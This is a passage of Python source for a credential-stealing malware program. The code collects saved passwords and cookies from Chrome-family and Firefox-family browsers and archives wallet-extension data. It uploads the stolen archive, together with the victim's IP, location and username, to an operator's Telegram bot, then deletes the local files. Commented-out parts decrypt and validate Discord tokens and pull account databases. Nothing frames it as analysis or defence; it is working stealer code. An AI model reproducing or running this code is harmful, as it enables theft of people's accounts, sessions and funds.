
gck_browser_profiles = {
    "Firefox": get_gck_profiles(get_gck_basepath("Firefox")),
    "Pale Moon": get_gck_profiles(get_gck_basepath("Pale Moon")),
    "SeaMonkey": get_gck_profiles(get_gck_basepath("SeaMonkey")),
    "Waterfox": get_gck_profiles(get_gck_basepath("Waterfox")),
    "Mercury": get_gck_profiles(get_gck_basepath("Mercury"))
}

#total_ch_logins_count = 0
#total_ch_cookies_count = 0
#total_ch_ccards_count = 0
#total_ch_autofill_count = 0

total_gck_logins_count = 0
total_gck_cookies_count = 0
#total_gck_ccards_count = 0

total_browsers_logins_count = 0
total_browsers_cookies_count = 0
total_browsers_ccards_count = 0

available_path = installed_ch_dc_browsers()


for browser in available_path:
    browser_path = ch_dc_browsers[browser]
    ch_master_key = get_ch_master_key(browser_path)
    if not glob.glob(os.path.join(browser_path, "Profile*")):
        profile_folders = [os.path.join(browser_path, "Default")]
    else:
        profile_folders = [os.path.join(browser_path, "Default")] + glob.glob(os.path.join(browser_path, "Profile*"))

    for profile_folder in profile_folders:
        profile = "" if browser in ["Opera", "Opera GX"] else os.path.basename(profile_folder)

        countP = get_ch_login_data(browser, browser_path, profile, ch_master_key)
#        total_ch_logins_count += countP
        
        countC = get_ch_cookies(browser, browser_path, profile, ch_master_key)
#        total_ch_cookies_count += countC

        #countAF = get_ch_autofill(browser, browser_path, profile)
        #total_ch_autofill_count += countAF

for browser, profiles in gck_browser_profiles.items():
    for profile in profiles:
        profile_name = os.path.basename(profile)

        logins_count = save_gck_login_data([profile], profile_name, browser)
        total_gck_logins_count += logins_count

        cookies_count = save_gck_cookies([profile], profile_name, browser)
        total_gck_cookies_count += cookies_count

#total_browsers_logins_count = total_ch_logins_count + total_gck_logins_count
#total_browsers_cookies_count = total_ch_cookies_count + total_gck_cookies_count
#total_browsers_ccards_count = total_ch_ccards_count + total_gck_ccards_count


#def decrypt_dc_tokens(buff, master_key):
#    try:
#        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
#    except:
#        pass

#def validate_dc_token(token):
#    headers = {"Authorization": token}
#    url = "https://discord.com/api/v8/users/@me"

#    try:
#        req = requests.get(url, headers=headers)
#        if req.status_code == 200:
#            return True
#    except:
#        pass
#    return False

#def get_all_valid_dc_tokens():
#    valid_tokens = set()
#
#    for browser in available_path:
#       browser_path = ch_dc_browsers[browser]
#        cleaned = []
#        try:
##                paths = [browser_path]
  #          else:
   #             paths = [f"{browser_path}\\Default"] + glob.glob(f"{browser_path}\\Profile*")
    #        for p in paths:
    #           lev_db = f"{p}\\Local Storage\\leveldb\\"
#                loc_state = f"{p}\\Local State"
#                if os.path.exists(loc_state):
#                    with open(loc_state, "r") as file:
#                        key = json.loads(file.read())['os_crypt']['encrypted_key']
#                    for file in os.listdir(lev_db):
#                        try:
#                            with open(lev_db + file, "r", errors='ignore') as files:
#                                for x in files.readlines():
#                                    x.strip()
#                                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
#                                        cleaned.append(values.replace("\\", ""))
#                        except:
#                            continue
#                    for token in cleaned:
#                        decrypted_token = decrypt_dc_tokens(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
#                        if decrypted_token and validate_dc_token(decrypted_token):
#                            valid_tokens.add((decrypted_token, browser))
#                for file_name in os.listdir(lev_db):
#                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
#                        continue
#                    for line in [x.strip() for x in open(f'{lev_db}\\{file_name}', errors='ignore').readlines() if x.strip()]:
#                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
#                            for token in re.findall(regex, line):
#                                if validate_dc_token(token):
#                                    valid_tokens.add((token, browser))
#        except FileNotFoundError:
#            continue
#    return valid_tokens

#tokens = get_all_valid_dc_tokens()

#main_dc_token = None
#all_dc_tokens = ""
#for token, path in tokens:
#    if path == "Discord" and not main_dc_token:
#        main_dc_token = token
 #   all_dc_tokens += f"- {path}: {token}\n"

#all_dc_tokens_count = len(tokens)

folders_to_archive = []
files_to_archive = []

for browser in available_path:
    browser_path = ch_dc_browsers[browser]
    for profile_dir in glob.glob(f"{browser_path}\\*"):
        if os.path.isdir(profile_dir):
            profile_name = os.path.basename(profile_dir)
            if profile_name == "Default":
                profile_name_ext = "Default"
            else:
                profile_name_ext = f"{profile_name}"
            #for folder, folder_info in ch_ext_folders.items():
            #    category = folder_info["category"]
            #    archive_name = f"{folder_info['archive_name']} ({browser} - {profile_name_ext})"
            #    folder_path = os.path.join(profile_dir, "Local Extension Settings", folder)
            #    if os.path.exists(folder_path):
            #        folders_to_archive.append((folder_path, os.path.join(category, archive_name, folder)))

#def GetIP():
#    try:
#        response = requests.get("http://ip-api.com/json/?fields=8195")
#        IData = json.loads(response.text)
#        SEIP = IData["query"]
#        CountryCode = IData["countryCode"]
#        CountryName = IData["country"]
#        GetIPD = f"IP: {SEIP}\nCountry: {CountryCode} - {CountryName}"
#    except:
#        GetIPD = "IP: N/A"
#        CountryCode = "Unknown"
#        SEIP = "Unknown"
#    return GetIPD, CountryCode, SEIP


#for fixed_path, folder_info in fixed_paths.items():
#    category = folder_info["category"]
#    archive_name = folder_info["archive_name"]
#    if os.path.exists(fixed_path):
#        folders_to_archive.append((fixed_path, os.path.join(category, archive_name)))

# def get_minsoftware_database():
#     result = ""
#     count = 0

#     for search_path in [f"{USR}\\Desktop", f"{USR}\\Documents", f"{USR}\\Downloads", f"{USR}\\OneDrive","D:\\", "E:\\"]:
#         for root, dirs, files in os.walk(search_path, topdown=True):
#             if "db_maxcare.sqlite" in files:
#                 db_path = os.path.join(root, "db_maxcare.sqlite")
#                 conn = sqlite3.connect(db_path)
#                 c = conn.cursor()
#                 c.execute("SELECT uid, pass, fa2, email, passmail, cookie1, token, info FROM accounts")
#                 rows = c.fetchall()
#                 for r in rows:
#                     uid, password, fa2, email, passmail, cookie, token, info = r
#                     if info == 'Live':
#                         result += f"{uid}|{password}|{fa2}|{email}|{passmail}|{cookie}|{token}\n"
#                         count += 1
#                 conn.close()
#     return result, count


#DCTokens = os.path.join(TMP, f"Discord Tokens.txt")
# DB_Minsoft = os.path.join(TMP, f"Minsoftware DataBase.txt")
# AccountsMC, CountMC = get_minsoftware_database()
#GetIPD, CountryCode, SEIP = GetIP()
Count = Counter()

#if all_dc_tokens_count > 0:
#    with open(DCTokens, "w", encoding="utf-8") as report:
#        report.write(f"{all_dc_tokens}\n")

# if CountMC > 0:
#     with open(DB_Minsoft, "w", encoding="utf-8") as db:
#         db.write(f"Format: UID|PASSWORD|2FA|EMAIL|PASSWORD MAIL|COOKIE|TOKEN\n\n{AccountsMC}")

zip_data = io.BytesIO()

#archive_path = os.path.join(TMP, f"[{CountryCode}_{SEIP}] {os.getenv('COMPUTERNAME', 'defaultValue')}.zip")
archive_path = os.path.join(TMP, f"{info_['country_code']} {info_['ip']} {creation_datetime}.zip")
with zipfile.ZipFile(zip_data, mode='w', compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zip_file:
    zip_file.comment = f"Time Created: {creation_datetime}\nContact: https://t.me/LoneNone".encode("utf-8")
    #if os.path.exists(DCTokens):
    #    zip_file.write(DCTokens, os.path.basename(DCTokens))
    # if os.path.exists(DB_Minsoft):
    #     zip_file.write(DB_Minsoft, os.path.basename(DB_Minsoft))

    for root, dirs, files in os.walk(PathBrowser):
        for file in files:
            file_path = os.path.join(root, file)
            relative_path = os.path.relpath(file_path, PathBrowser)
            archive_file_path = os.path.join("Browsers Data", relative_path)
            try:
                zip_file.write(file_path, archive_file_path)
            except:
                continue

        for dir in dirs:
            dir_path = os.path.join(root, dir)
            relative_path = os.path.relpath(dir_path, PathBrowser)
            archive_dir_path = os.path.join("Browsers Data", relative_path)
            try:
                zip_file.write(dir_path, archive_dir_path)
            except:
                continue

    for folder_path, archive_sub_path in folders_to_archive:
        excluded_dirs = []
        for dir_name in os.listdir(folder_path):
            if dir_name.startswith("user_data"):
                excluded_dirs.append(dir_name)
        dirs_to_exclude = set(excluded_dirs)

        for root, dirs, files in os.walk(folder_path):
            #dirs[:] = [d for d in dirs if d not in dirs_to_exclude and d not in ["emoji", "tdummy", "dumps", "webview", "update-cache", "GPUCache", "DawnCache", "temp", "Code Cache", "Cache"]]
            for file in files:
                file_path = os.path.join(root, file)
                if os.path.isfile(file_path) and ".zip" not in file:
                    relative_path = os.path.relpath(file_path, folder_path)
                    archive_file_path = os.path.join(archive_sub_path, relative_path)
                    try:
                        zip_file.write(file_path, archive_file_path)
                    except:
                        continue

            for dir in dirs:
                dir_path = os.path.join(root, dir)
                if os.path.isdir(dir_path):
                    relative_path = os.path.relpath(dir_path, folder_path)
                    archive_dir_path = os.path.join(archive_sub_path, relative_path)
                    try:
                        zip_file.write(dir_path, archive_dir_path)
                    except:
                        continue

    for file_path, archive_sub_path, file_renamed in files_to_archive:
        archive_file_path = os.path.join(archive_sub_path, file_renamed)
        try:
            zip_file.write(file_path, archive_file_path)
        except:
            continue

with open(archive_path, "wb") as f:
    f.write(zip_data.getbuffer())

#InfomationData = ""

#for category in categories_order:
#   folder_counts = {}
#    if folder_info["category"] == category and folder in [os.path.basename(x[0]) for x in sorted(folders_to_archive, key=lambda x: x[1])]:
#            folder_counts[folder_info['archive_name']] = folder_counts.get(folder_info['archive_name'], 0) + sum([1 for x in folders_to_archive if os.path.basename(x[0]) == folder])
#    for folder_path, folder_info in sorted(fixed_paths.items(), key=lambda x: x[1]["archive_name"]):
#        if folder_info["category"] == category and folder_path in [x[0] for x in sorted(folders_to_archive, key=lambda x: x[1])]:
#            folder_counts[folder_info['archive_name']] = folder_counts.get(folder_info['archive_name'], 0) + sum([1 for x in folders_to_archive if x[0] == folder_path])
#    for folder_name, folder_count in folder_counts.items():
#        if folder_count > 0:
#            folder_line = f"- {folder_name}\n"
#            if folder_count > 1:
#                folder_line += f" ({folder_count})\n"
#            folder_lines.append(folder_line)
#    InfomationData += "\n".join(folder_lines)

#if all_dc_tokens_count > 0:
#    InfomationData += f"- Discord Token ({all_dc_tokens_count})\n"

# if CountMC > 0:
#     InfomationData += f"- Minsoftware ({CountMC} Accounts)\n"

#if InfomationData == "":
#    InfomationData = "\rN/A"

message_body = f"country :  {info_['city']}-{info_['region']}-{info_['country_code']}\nID : {id()}\n{info_['windows_version']}\nIP:{info_['ip']}\nUsername: {info_['user_pc']} {os.getlogin()}\n{Count}"
#archive_path = os.path.join(TMP, f"{info_["country_code"]} {info_["ip"]} {creation_datetime}.zip")
for i in range(10):
    if Count == 1:
        CHAT_ID = CHAT_ID_NEW #Sv Data Má»›i
    else:
        CHAT_ID = CHAT_ID_RESET #Sv Data Update (Send tá»« láº§n 2)

    try:
        with open(archive_path, "rb") as f:
            response = requests.post(
                f"https://api.telegram.org/bot{TOKEN_BOT}/sendDocument",
                params={"chat_id": CHAT_ID, "caption": message_body, "protect_content": True, "disable_web_page_preview": True},
                files={"document": f}
            )
            response.raise_for_status()
            break
    except:
        continue

shutil.rmtree(PathBrowser, ignore_errors=True)

if os.path.exists(archive_path):
    os.remove(archive_path)
#if os.path.exists(DCTokens):
#    os.remove(DCTokens)
# if os.path.exists(DB_Minsoft):
#     os.remove(DB_Minsoft)